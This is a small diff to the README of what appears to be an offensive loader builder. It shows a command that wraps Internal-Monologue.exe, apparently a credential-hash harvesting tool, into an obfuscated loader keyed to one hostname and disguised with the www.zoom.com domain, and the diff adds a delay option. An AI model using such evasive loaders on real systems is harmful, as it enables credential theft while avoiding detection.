@@ -32,7 +32,7 @@ sudo bash install.sh
 ## Usage
 
 ```
-python build.py --file /tmp/Internal-Monologue.exe --hostname PFC-SYSCTR --domain www.zoom.com
+python build.py --file /tmp/Internal-Monologue.exe --hostname PFC-SYSCTR --domain www.zoom.com --delay 60
 
 [+] Obfuscated loader source files
 [+] Keyed on hostname PFC-SYSCTR
